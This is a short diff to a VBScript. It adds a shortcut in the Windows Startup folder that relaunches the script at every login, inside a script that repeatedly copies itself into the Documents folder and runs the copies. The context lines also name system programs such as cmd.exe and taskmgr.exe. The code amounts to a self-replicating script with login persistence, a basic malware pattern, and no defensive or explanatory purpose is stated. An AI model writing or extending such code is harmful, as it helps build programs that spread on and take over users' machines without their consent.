@@ -2,6 +2,12 @@ Set WshShell = WScript.CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")
 
+' Add script to Startup folder
+strStartupPath = WshShell.SpecialFolders("Startup")
+Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\RunCopies.vbs.lnk")
+objShellLink.TargetPath = WScript.ScriptFullName
+objShellLink.Save
+
 For i = 1 To 10
     ' Copy script to Documents folder and run the copy
     strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
